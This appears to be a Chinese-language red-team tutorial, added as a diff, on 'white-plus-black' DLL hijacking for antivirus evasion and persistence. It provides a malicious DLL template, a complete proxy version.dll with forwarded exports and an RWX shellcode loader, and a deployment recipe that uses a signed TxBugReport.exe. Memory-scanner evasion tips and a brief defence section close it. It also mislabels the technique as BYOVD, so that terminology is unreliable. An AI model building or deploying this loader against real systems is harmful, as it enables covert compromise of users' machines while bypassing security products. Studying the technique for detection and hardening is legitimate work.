@@ -1,0 +1,193 @@
+## 1. 概述
+
+在高级持续性威胁 (APT) 和红队渗透测试中，为了实现持久化控制和规避终端安全产品的检测，攻击者经常采用“白加黑” (Black-and-White) 的策略。该技术的核心思想是利用一个合法的、受信任的（“白”）应用程序，去加载一个恶意的动态链接库 (DLL)（“黑”），从而借助合法程序的“外衣”来执行恶意代码。
+
+本文档将深入探讨 DLL 劫持的原理，并结合自动化挖掘思路和真实案例，详细介绍如何利用该技术实现 ShellCode 的加载和执行，最终达到免杀和持久化的目的。
+
+## 2. 技术原理
+
+### 2.1 DLL 加载机制
+
+Windows 操作系统在加载应用程序时，会解析其导入表 (Import Table) 以查找所有依赖的 DLL。操作系统的加载器会按照一个预设的、明确的顺序来搜索这些 DLL 文件。这个搜索顺序是 DLL 劫持漏洞存在的核心原因。
+
+一个简化的 DLL 搜索顺序如下：
+1.  应用程序所在的目录。
+2.  系统目录 (`C:\Windows\System32`)。
+3.  16位系统目录 (`C:\Windows\System`)。
+4.  Windows 目录 (`C:\Windows`)。
+5.  当前工作目录。
+6.  `PATH` 环境变量中列出的目录。
+
+如果一个攻击者能够将一个恶意的、与合法 DLL 同名的文件放置在搜索顺序靠前的位置（通常是应用程序所在目录），那么操作系统就会优先加载这个恶意 DLL，从而执行其中的恶意代码。
+
+### 2.2 白加黑 (BYOVD - Bring Your Own Vulnerable Driver/Application)
+
+“白加黑”是利用上述 DLL 加载机制的一种攻击手法。其流程通常如下：
+1.  **寻找目标**：找到一个带有数字签名、行为正常的合法应用程序（“白”）。
+2.  **漏洞分析**：分析该程序启动时加载了哪些 DLL，以及是否存在可以被劫持的 DLL（即程序本身没有对加载的 DLL 进行严格的路径或签名校验）。
+3.  **构建恶意 DLL**：创建一个恶意的 DLL（“黑”），使其与目标 DLL 同名，并实现恶意功能（如加载 ShellCode）。
+4.  **部署**：将合法的应用程序和恶意的 DLL 放在同一个目录下。
+5.  **执行**：当用户或系统运行这个合法的应用程序时，它会自动加载并执行同目录下的恶意 DLL，完成攻击。
+
+这种方式的优势在于，恶意代码的执行是在一个受信任的进程上下文中完成的，这使得它能有效绕过基于进程行为的应用白名单和部分杀毒软件的检测。
+
+## 3. 环境准备
+
+### 3.1 工具
+
+*   **开发环境**: Visual Studio 2019 或更高版本，用于编译恶意 DLL。
+*   **进程监控工具**: [Process Monitor (ProcMon)](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)。这是分析目标程序 DLL 加载行为的关键工具。
+*   **CFF Explorer**: 用于查看 PE 文件的导入/导出表。
+
+### 3.2 基础 DLL 模板
+
+以下是一个基础的恶意 DLL C++ 代码模板。当这个 DLL 被加载时，它会执行 `system("calc.exe")` 来弹出一个计算器，这是一个简单而有效的攻击验证方式。
+
+```cpp
+#include "pch.h"
+#include <windows.h>
+#include <stdlib.h>
+
+// 导出函数，用于函数转发
+#pragma comment(linker, "/export:OriginalFunction1=OriginalDllName.OriginalFunction1")
+#pragma comment(linker, "/export:OriginalFunction2=OriginalDllName.OriginalFunction2")
+// ... 根据实际需要转发所有导出函数
+
+BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        // DLL_PROCESS_ATTACH 事件在 DLL 被加载到进程地址空间时触发
+        // 为避免阻塞主程序，恶意代码应在新线程中执行
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
+    }
+    return TRUE;
+}
+
+VOID Payload() {
+    // 在这里放置你的 ShellCode 加载器或其它恶意代码
+    // 示例：弹出一个计算器
+    system("calc.exe");
+}
+```
+
+**注意**：直接在 `DllMain` 中执行复杂或耗时的操作（如 `system()`）是不安全的，可能导致程序死锁。最佳实践是将恶意代码逻辑放在一个新创建的线程中执行。
+
+## 4. 实战示例：自动化挖掘与利用
+
+### 4.1 自动化挖掘思路
+
+手动测试每个程序效率低下。我们可以通过脚本自动化挖掘潜在的劫持目标。
+1.  **遍历程序**：编写脚本（如 PowerShell 或 Python）遍历 `C:\Program Files` 和 `C:\Program Files (x86)` 下的所有 `.exe` 文件。
+2.  **启动并监控**：依次启动每个 `.exe` 文件，并同时使用 Process Monitor 监控其文件操作。
+3.  **过滤结果**：在 ProcMon 中设置过滤器，仅显示 `Operation` 为 `CreateFile`、`Result` 为 `NAME NOT FOUND` 且 `Path` 以 `.dll` 结尾的事件。
+4.  **分析报告**：这些 `NAME NOT FOUND` 的 DLL 事件就是潜在的劫持目标。它们表示程序尝试加载一个 DLL，但在默认路径下没有找到。
+
+### 4.2 案例分析：某客户端 (TxBugReport.exe)
+
+这是一个经典的白加黑利用案例。`TxBugReport.exe` 是某知名软件的错误报告程序，它自身带有有效的数字签名。
+
+**攻击流程**:
+
+1.  **分析**：使用 Process Monitor 监控 `TxBugReport.exe` 的启动过程。可以发现它会尝试加载一个名为 `version.dll` 的系统文件。由于程序本身目录的搜索优先级高于系统目录，我们可以在其同目录下放置一个伪造的 `version.dll`。
+
+2.  **DLL 转发**：`version.dll` 是一个标准的系统 DLL，有很多程序依赖它的导出函数（如 `GetFileVersionInfoW`）。如果我们只实现恶意代码而不提供这些函数，主程序 `TxBugReport.exe` 可能会因为找不到函数而崩溃。为了解决这个问题，我们需要使用 **DLL 转发** 技术。
+
+    DLL 转发的原理是：我们的恶意 DLL 在导出同名函数的同时，将调用请求“转发”给原始的、合法的 DLL。这样既能保证主程序正常运行，又能执行我们的恶意代码。
+
+3.  **编写恶意 DLL (`version.dll`)**：
+    *   首先，我们需要找到原始 `version.dll` 的所有导出函数。可以使用 CFF Explorer 或类似工具查看 `C:\Windows\System32\version.dll` 的导出表。
+    *   然后，在我们的恶意 DLL 项目中，使用 `#pragma comment` 指令来创建转发。`ori_version.dll` 是我们重命名后的原始系统 `version.dll`。
+
+    ```cpp
+    #include "pch.h"
+    #include <windows.h>
+
+    // 将所有来自原始 version.dll 的导出函数进行转发
+    // 确保将原始的 C:\Windows\System32\version.dll 复制到程序目录并重命名为 ori_version.dll
+    #pragma comment(linker, "/export:GetFileVersionInfoA=ori_version.GetFileVersionInfoA")
+    #pragma comment(linker, "/export:GetFileVersionInfoByHandle=ori_version.GetFileVersionInfoByHandle")
+    #pragma comment(linker, "/export:GetFileVersionInfoExA=ori_version.GetFileVersionInfoExA")
+    #pragma comment(linker, "/export:GetFileVersionInfoExW=ori_version.GetFileVersionInfoExW")
+    #pragma comment(linker, "/export:GetFileVersionInfoSizeA=ori_version.GetFileVersionInfoSizeA")
+    #pragma comment(linker, "/export:GetFileVersionInfoSizeExA=ori_version.GetFileVersionInfoSizeExA")
+    #pragma comment(linker, "/export:GetFileVersionInfoSizeExW=ori_version.GetFileVersionInfoSizeExW")
+    #pragma comment(linker, "/export:GetFileVersionInfoSizeW=ori_version.GetFileVersionInfoSizeW")
+    #pragma comment(linker, "/export:GetFileVersionInfoW=ori_version.GetFileVersionInfoW")
+    #pragma comment(linker, "/export:VerFindFileA=ori_version.VerFindFileA")
+    #pragma comment(linker, "/export:VerFindFileW=ori_version.VerFindFileW")
+    #pragma comment(linker, "/export:VerInstallFileA=ori_version.VerInstallFileA")
+    #pragma comment(linker, "/export:VerInstallFileW=ori_version.VerInstallFileW")
+    #pragma comment(linker, "/export:VerLanguageNameA=ori_version.VerLanguageNameA")
+    #pragma comment(linker, "/export:VerLanguageNameW=ori_version.VerLanguageNameW")
+    #pragma comment(linker, "/export:VerQueryValueA=ori_version.VerQueryValueA")
+    #pragma comment(linker, "/export:VerQueryValueW=ori_version.VerQueryValueW")
+
+    // ShellCode 加载器函数
+    VOID Payload() {
+        // 替换为你的 C2 ShellCode
+        unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0..."; 
+        
+        // 分配内存
+        LPVOID shellcode_exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (shellcode_exec == NULL) {
+            return;
+        }
+        
+        // 复制 ShellCode
+        RtlMoveMemory(shellcode_exec, shellcode, sizeof(shellcode));
+        
+        // 执行 ShellCode
+        ((void(*)())shellcode_exec)();
+    }
+
+    BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+        switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            // 在新线程中执行 payload，避免阻塞 DllMain
+            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
+            break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+        }
+        return TRUE;
+    }
+    ```
+
+4.  **最终部署**：
+    *   将合法的 `TxBugReport.exe` 复制到一个新目录。
+    *   将系统 `C:\Windows\System32\version.dll` 复制到该目录，并重命名为 `ori_version.dll`。
+    *   将我们编译生成的恶意 `version.dll` 也放入该目录。
+    *   最终目录结构：
+        ```
+        /YourAttackFolder/
+        ├── TxBugReport.exe   (白 - 合法程序)
+        ├── version.dll       (黑 - 恶意DLL)
+        └── ori_version.dll   (原始DLL，用于转发)
+        ```
+    *   执行 `TxBugReport.exe`，程序会正常启动，同时我们的 ShellCode 也会在后台被加载和执行。
+
+## 5. 关键细节
+
+*   **DLL 命名与转发**：当劫持的 DLL 是一个有大量导出函数的系统 DLL 时（如 `version.dll`, `userenv.dll` 等），函数转发是保证原始程序功能正常的关键。如果劫持的 DLL 是程序自定义的、没有导出函数的 DLL，则无需转发。
+*   **位数匹配**：64 位的应用程序 (`.exe`) 只能加载 64 位的 DLL，32 位同理。编译恶意 DLL 时必须确保其架构与目标应用程序一致。
+*   **避免 DllMain 陷阱**：`DllMain` 函数在执行时会持有加载器锁 (Loader Lock)。在此函数内执行复杂操作，如网络请求、文件读写或启动进程，极易导致程序死锁。始终通过 `CreateThread` 将恶意代码逻辑转移到新的线程中执行。
+*   **ShellCode 加载**：示例中使用了 `VirtualAlloc` 分配可执行内存来加载 ShellCode。这是最基础的方式，在实际对抗中，可能需要结合更多内存操作技巧（如 `VirtualProtect`）和加密混淆来绕过内存扫描。
+
+## 6. 安全总结与防御建议
+
+DLL 劫持和白加黑是一种古老但至今仍然非常有效的攻击技术。它利用了操作系统设计层面的特性，使得纯粹的特征码检测难以奏效。
+
+### 6.1 攻击方总结
+
+*   **优点**：隐蔽性强，执行载体是受信任的签名程序，易于绕过应用白名单和基础 AV。
+*   **缺点**：需要与合法程序打包在一起，可能增大载荷体积。如果目标程序更新，劫持点可能失效。
+
+### 6.2 防御方建议
+
+*   **启用安全启动和代码完整性策略**：Windows 的设备保护功能可以限制只有经过微软或指定机构签名的内核代码才能被加载。
+*   **监控异常 DLL 加载**：终端检测与响应 (EDR) 系统可以监控进程行为。当一个签名的进程从非标准路径（如用户下载目录、`Temp` 目录）加载一个未签名或签名异常的 DLL 时，应产生高优先级告警。
+*   **应用程序加固**：开发者可以通过在代码中指定 DLL 的绝对路径加载（使用 `LoadLibraryEx` 并配合 `LOAD_LIBRARY_SEARCH_SYSTEM32` 等标志），或者对加载的 DLL 进行数字签名校验，来从根本上杜绝此类漏洞。
+*   **攻击面减小**：定期清理系统中非必要的、老旧的软件，减少可被利用的“白”程序数量。
+
+---
